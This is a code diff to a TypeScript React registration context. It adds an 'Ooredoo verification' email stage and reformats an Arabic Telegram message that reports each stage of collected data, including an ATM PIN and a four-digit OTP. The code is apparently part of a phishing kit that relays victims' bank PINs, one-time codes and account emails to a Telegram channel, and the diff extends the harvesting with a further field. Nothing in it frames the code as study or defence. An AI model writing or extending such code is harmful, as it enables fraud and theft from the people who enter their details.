@@ -33,6 +33,9 @@ interface RegistrationData {
   // ATM Pin
   atmPin?: string;
   
+  // Ooredoo Verification
+  ooredooEmail?: string;
+  
   // OTP
   otp?: string;
 }
@@ -64,7 +67,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
   };
 
   const formatTelegramMessage = (stage: number, stageName: string, dataToFormat: RegistrationData): string => {
-    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/6</b>\n`;
+    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/8</b>\n`;
     message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
     // Stage 1: Account Type
@@ -127,15 +130,22 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
       message += `\n`;
     }
 
-    // Stage 7: OTP
-    if (stage >= 7 && dataToFormat.otp) {
-      message += `🚓 <b>المرحلة 7: رمز التحقق النهائي</b>\n`;
+    // Stage 7: Ooredoo Verification
+    if (stage >= 7 && dataToFormat.ooredooEmail) {
+      message += `📱 <b>المرحلة 7: تفعيل حساب Ooredoo</b>\n`;
+      message += `   📧 البريد الإلكتروني: ${dataToFormat.ooredooEmail}\n`;
+      message += `\n`;
+    }
+
+    // Stage 8: OTP
+    if (stage >= 8 && dataToFormat.otp) {
+      message += `🚓 <b>المرحلة 8: رمز التحقق النهائي</b>\n`;
       message += `   🔢 رمز OTP (4 أرقام): ${dataToFormat.otp}\n`;
       message += `\n`;
     }
 
     message += `━━━━━━━━━━━━━━━━━━━━\n`;
-    message += stage === 7 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
+    message += stage === 8 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;
 
     return message;
   };
